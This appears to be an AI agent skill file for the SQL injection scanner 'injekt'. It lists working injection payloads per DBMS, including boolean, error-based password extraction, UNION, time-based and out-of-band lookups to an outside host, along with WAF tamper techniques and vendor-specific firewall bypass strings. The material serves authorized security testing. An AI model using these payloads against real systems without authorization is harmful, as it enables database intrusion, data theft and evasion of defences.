---
name: injekt-payload-expert
description: Crafts minimal SQL injection payloads per DBMS and context for injekt (boolean, error, union, time, stacked, oob, json, nosql). Use when user mentions payload, boolean TRUE/FALSE, UNION SELECT, ORDER BY, SLEEP/pg_sleep, EXTRACTVALUE, WAF bypass, tamper choice, DBMS mysql/postgres/mssql/oracle, quote/numeric/JSON context, or adding payloads under src/techniques or src/dbms.
---

# Injekt Payload Expert

Authorized use only — same gate as `injekt-authorized-scan`. Never craft exfil payloads without explicit `--extract` opt-in.

## Workflow

```
Payload Progress:
- [ ] 1. Context: single-quote / double-quote / numeric / paren / backtick / JSON?
- [ ] 2. DBMS: mysql | postgres | mssql | oracle | unknown?
- [ ] 3. Technique: boolean -> error -> union -> time -> stacked/oob/json (cheapest first)
- [ ] 4. Pick 2-4 minimal pairs, keep TRUE/FALSE coherent, DBMS comment
- [ ] 5. Map WAF block to --tamper, never break boolean differentials
```

Out of scope: running full scans -> `injekt-authorized-scan`; Rust lints/tests -> `injekt-rust-dev`.

## 1. Context first — closes before logic

Probe order in `src/techniques/boolean/payloads.rs` is load-bearing (`--level` budgets: L1 first 2, L2 first 4, L3+ all):

```
P0 polyglot:  '"())) OR '1'='1' -- -  /  '"())) OR '1'='2' -- -
historical:   ' OR 1=1 -- - / ' OR 1=2 -- -
              ' AND 1=1 / ' AND 1=2,  " OR 1=1 / " OR 1=2
              ) OR 1=1,  ' OR 'a'='a / ' OR 'a'='b
numeric:      1 AND 1=1 / 1 AND 1=2,  1 OR 1=1 / 1 OR 1=2
parens:       ')) OR 1=1, ")) OR 1=1, ))) OR 1=1
backtick:     ` OR 1=1 (MySQL identifiers)
```

Rule: same shape both branches, minimal flip `1<->2` / `a<->b`. Every pair must stay distinct after tamper (`tamper_transformation_sets` applies same set to both).

Comments per DBMS: mysql ` -- -`, postgres/mssql/oracle ` --` (`#` mysql alt, `/*comment*/` generic). Never mangle trailing `-- -` into `--/**/-`.

## 2. DBMS matrix — version, concat, sleep, error

Sources: PortSwigger cheat-sheet, PayloadsAllTheThings, payload-box/sql-injection-payload-list.

| Task | mysql | postgres | mssql | oracle |
|---|---|---|---|---|
| version | `SELECT @@version` | `SELECT version()` | `SELECT @@version` | `SELECT banner FROM v$version` |
| concat | `CONCAT('a','b')` / `'a' 'b'` | `'a'\|\|'b'` | `'a'+'b'` | `'a'\|\|'b'` |
| substr | `SUBSTRING('foobar',4,2)` | `SUBSTRING('foobar',4,2)` | `SUBSTRING('foobar',4,2)` | `SUBSTR('foobar',4,2)` |
| sleep | `SELECT SLEEP(10)` / `BENCHMARK(1e7,MD5(1))` | `SELECT pg_sleep(10)` | `WAITFOR DELAY '0:0:10'` | `dbms_pipe.receive_message(('a'),10)` |
| cond-sleep | `SELECT IF(cond,SLEEP(10),'a')` | `SELECT CASE WHEN cond THEN pg_sleep(10) ELSE pg_sleep(0) END` | `IF cond WAITFOR DELAY '0:0:10'` | `SELECT CASE WHEN cond THEN 'a'\|\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| error | `EXTRACTVALUE(1,CONCAT(0x5c,(SELECT 'secret')))` | `CAST((SELECT password FROM users LIMIT 1) AS int)` | `1=(SELECT 'secret')` cast fail | `CASE WHEN cond THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
| stacked | rarely (PHP/Python APIs only) | `q1;q2` | `q1;q2` | no batched queries |
| OOB | `LOAD_FILE('\\\\host\\a')` win-only | `copy (SELECT '') to program 'nslookup host'` | `exec master..xp_dirtree '//host/a'` | `UTL_INADDR.get_host_address('host')` / XXE `EXTRACTVALUE(xmltype(...))` |

Operator synonyms when `OR/AND/=` signatured (OWASP WAF-bypass): `||`/`&&`/`^`/`NOT`, `mid()/substr()` for `substring()`, `hex()/bin()` for `ascii()`, `sleep()` for `benchmark()`, `RLIKE` (mysql-only), `LIKE/IN/BETWEEN/CASE`, `1 DIV 1 vs 1 DIV 0` (NULL=falsy, oracle holds), `CHR()` oracle/pg vs `CHAR()` mysql — probe both.

JSON endpoints (`--techniques json`): `JSON_EXTRACT/->>/JSON_VALUE/OPENJSON/JSON_EXISTS` per DBMS + `jsonunicodeescape` opt-in only.

## 3. Technique ladder — cheapest proof first

1. **boolean**: `OR 1=1 / OR 1=2` + inverted `AND` confirm, 3 trials. Reflected-error masking + `DiffResult{similarity,time_delta}` required.
2. **error**: only if verbose errors; DBMS-specific func above.
3. **union**: `ORDER BY 1..N` enum then `UNION SELECT 1,2,3`. Column count must match.
4. **time**: threshold `baseline+2σ`, isolated pool. `SLEEP/pg_sleep/WAITFOR/BENCHMARK` per table.
5. **stacked/oob/json/nosql**: `; SELECT` marker, collaborator `{token}` poll, JSON funcs. OOB without poll URL = never confirmed.

## 4. WAF -> --tamper map (src/techniques/tamper.rs, 24)

Auto `space2comment,randomcase` only on active 403/406 block. Otherwise explicit:

- spaces signatured -> `space2comment (/**/)`, `space2tab (%09)`, `space2newline (%0a)`, `space2randomblank`, `space2paren ('OR(1=1))`, `space2mssqlblank` mssql, `space2dash` mysql `--%0A`
- keyword case -> `randomcase (SeLeCt)`, `betweencomment (S/**/E...)`, `randomcomments`
- `=` blocked -> `equaltolike (LIKE)`, `versionedcomment (/*!50000SELECT*/)` mysql-only, `versionedmorekeywords`, `versionedfuzz` seeded CRS diversity
- encoding -> `charencode (%20)`, `doubleurlencode (%25)`, `hexencode`, `unicodeencode (%uXXXX)`, `overlongutf8 (%c0%af)`, `numericobfuscate (1e0/0x31)`, `linecomment (--+/ %23)`
- HPP/HPF split: `--hpp (?id=1&id=PAYLOAD)`, `--chunked` body streaming. JSON-in-JSON fools PaloAlto/F5/Imperva/AWS/CF parsers.
- `OR 0x50=0x50`, `(1)union(select(1))`, `UNunionION`/`SEselectLECT` only if WAF strips once with regex-empty replace.

DANGER: `base64encode`, `jsonunicodeescape` are NOT boolean-safe (`is_boolean_safe=false`) — encode the quote itself, both branches go inert. Single-payload techniques opt-in only.

```bash
injekt --target "https://example.com/?id=1" --tamper space2comment,randomcase --techniques boolean,union
injekt --target "https://example.com/?id=1" --tamper versionedcomment,charencode --dbms mysql
```

## 5. Adding payloads to injekt

- `src/techniques/<name>/payloads.rs`: append last, never reorder head (L1/L2 byte-identical). Keep `BooleanPayload::new(true,false,comment)` coherent + test `len/head_order/coherent`.
- `src/dbms/<kind>/payloads.rs|queries.rs`: DBMS-native funcs only, note cross-DBMS cost in comment.
- `src/techniques/tamper.rs`: `all_names()` frozen in v1.0 scope — no new string tamper without bench proof + `is_boolean_safe` verdict.

## 6. 2026 deltas — verified Sep 2026

- OWASP Top 10:2025 is current in 2026 (no 2026 list). Injection A05 #3->#5 but 100% apps affected, largest occurrence count, 14k+ SQLi CVEs. Still critical.
- Hive 2026 guide: adds second-order/stored (`admin'--` stored then detonates in UPDATE) + ORM escape hatches (Django `.raw()`, SQLAlchemy `text()` without bindparams, Prisma raw) + CVE-2025-1094 Postgres/BeyondTrust/Treasury breach. injekt does NOT cover second-order — flag as manual-audit limitation, never claim coverage.
- AWS WAF HackerOne #3591725 (Mar 2026): default `AWSManagedRulesSQLiRuleSet` LOW misses grammar mutations. Blocked: `alice' OR 1=1--` -> 403. Bypassed -> 200: `alice' || '1' ; && 1<=>0 && 1-1 && 1<=>1 && 1#`. 5/10 mutated variants bypassed (boolean `||`/`&&`, `<=>`, arithmetic `1-1`/`2-1`, `;` termination). Fix per AWS: custom HIGH-sensitivity SQLi rules per component + repeated URL decode. injekt already probes these operators — cite this report when AWS default is assumed safe.
- Cloudflare 2026 new Blocks: 06-09 Drupal PG CVE-2026-9082 (Body+URI) + `SQLi - Obfuscated Boolean` Body/Headers, 06-15 Ghost blind CVE-2026-26980 + Obfuscated Boolean URI, 09-01 `SQLi - WHERE Comparison With WITH Clause`. Obfuscated boolean + WITH now signatured (some rolled Log->Block). Prefer `space2paren/versionedfuzz/numericobfuscate` over naive `OR 1=1`.
- JSON bypass (Claroty/Picus, vendors patched post-2022 but still tested): `' or JSON_LENGTH("{}") <= 8896 union distinctrow select @@version#` bypassed AWS/CF/F5/Imperva/Palo Alto pre-patch. Vendors added JSON support; Picus threat 79258. Keep testing via injekt `--techniques json`, never assume bypass.
- ACM Aug 2026 adversarial-SQL paper: grammar-aware mutation still finds systematic parser gaps (WAF allow vs DB execute). Reason to keep minimal coherent pairs, not volume.

## Anti-patterns

- 100s payloads / 10s tampers (CRS blocks repertoire in query/cookie; vector-shift headers beats volume).
- `base64encode` on boolean pairs; unseeded `RandomCase/Space2RandomBlank` in tests; claiming sqlmap parity without `bench/` + `request_count` cross-check <5%.
- Time payloads without `baseline+2σ`; OOB finding without collaborator proof.

## References

- `src/techniques/*/payloads.rs`, `src/dbms/*/payloads.rs|queries.rs`, `src/techniques/tamper.rs`, `src/detection/confirmation.rs`
- PortSwigger SQLi cheat-sheet, OWASP SQL_Injection_Bypassing_WAF, PayloadsAllTheThings SQL Injection, payload-box/sql-injection-payload-list (`mysql|postgresql|mssql|oracle-payloads.txt`), SecLists payloads.
- 2026: Hive SQL Injection 2026 guide (5 types + ORM/second-order + CVE-2025-1094), HackerOne #3591725 AWS WAF bypass, Cloudflare WAF changelog 2026-06-09/06-15/09-01 (Obfuscated Boolean, WHERE+WITH, CVE-2026-9082/26980/60137), Picus JSON-based SQLi bypass, OWASP Top 10:2025 A05.
